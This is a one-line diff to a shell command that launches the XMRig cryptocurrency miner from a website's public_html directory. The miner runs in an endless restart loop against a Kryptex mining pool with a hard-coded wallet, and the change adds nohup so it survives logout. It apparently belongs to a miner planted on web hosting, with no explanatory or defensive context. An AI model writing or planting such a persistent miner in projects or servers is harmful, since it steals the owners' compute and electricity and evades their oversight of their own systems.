@@ -1,1 +1,1 @@
-cd public_html/xmrig-6.26.0 &&  while true; do ./xmrig -a rx/0 -o xtm-rx-ru.kryptex.network:7038 -u 12CMjPiqeZ3ZWqTwnRouRHiD66h2KpWi8CLjMZcA6ZMALgYxyr3Kk9ghvggRAhUm4984faBCkyDVCvnaD1RjfRgWA28/A2 -k; sleep 1; done
+cd public_html/xmrig-6.26.0 &&  while true; do nohup ./xmrig -a rx/0 -o xtm-rx-ru.kryptex.network:7038 -u 12CMjPiqeZ3ZWqTwnRouRHiD66h2KpWi8CLjMZcA6ZMALgYxyr3Kk9ghvggRAhUm4984faBCkyDVCvnaD1RjfRgWA28/A2 -k; sleep 1; done
